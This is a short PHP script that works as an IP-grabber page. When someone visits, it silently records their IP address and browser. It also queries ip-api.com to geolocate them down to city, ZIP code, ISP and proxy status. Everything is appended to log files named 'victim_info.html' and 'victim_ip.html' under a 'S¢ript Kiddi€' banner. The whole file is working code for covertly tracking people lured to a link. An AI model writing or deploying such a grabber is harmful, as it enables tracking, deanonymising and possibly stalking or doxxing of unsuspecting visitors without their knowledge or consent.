<!-- PHP -->
<?php
error_reporting(0);
/*Add your country timezone accordingly*/
date_default_timezone_set('Asia/Kolkata');
?>
<?php
$ip = $_SERVER['REMOTE_ADDR'];
$ip_info = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);

$country = $ip_info['country'];
$proxy = $ip_info['proxy'];
$mobile = $ip_info['mobile'];
$continent = $ip_info['continent'];
$hosting = $ip_info['hosting'];
$dns = $ip_info['dns'];
$regionName = $ip_info['regionName'];
$isp = $ip_info['isp'];
$org = $ip_info['org'];
$as = $ip_info['as'];
$city = $ip_info['city'];
$zip = $ip_info['zip'];
$timezone = $ip_info['timezone'];
$browser = $_SERVER['HTTP_USER_AGENT'];
$dateTime = date('d/M/y h:i:s');
$file = "victim_info.html";
$file = fopen($file, "a");
$data = "<pre><b>User IP</b>: $ip <br>Proxy</b>: $proxy <br>Browser</b>: $browser <br>City</b>: $city <br>Zipcode</b>: $zip <br>State</b>: $regionName <br>Isp</b>: $isp <br>Org</b>: $org<br>As</b>: $as<br>Timezone</b>: $timezone <br>Time: $dateTime <br>Country: $country <br>Continent</b>: $continent <br>Mobile</b>: $mobile <br>Hosting</b>: $hosting <br>Dns</b>: $dns </pre>";
fwrite($file, $data);
fclose($file);
echo "<h1>S¢ript Kiddi€:)</h1>";
?>
<?php
// Logs the ip address of guests/members of your site.

// add the full path to the log file

$directory_self = str_replace(basename($_SERVER['PHP_SELF']), '', $_SERVER['PHP_SELF']);

$logfile= $_SERVER['DOCUMENT_ROOT'] . $directory_self . 'victim_ip.html';

// gets the ip
$IP = $_SERVER['REMOTE_ADDR'];

// logs the date 
$logdetails=  date("F j, Y, g:i a") . ' : ' . $IP ;


// open the log.html and adds the entry
$fp = fopen($logfile, "a"); 
fwrite($fp, $logdetails);
fwrite($fp, "<br>");
fclose($fp); 
?>
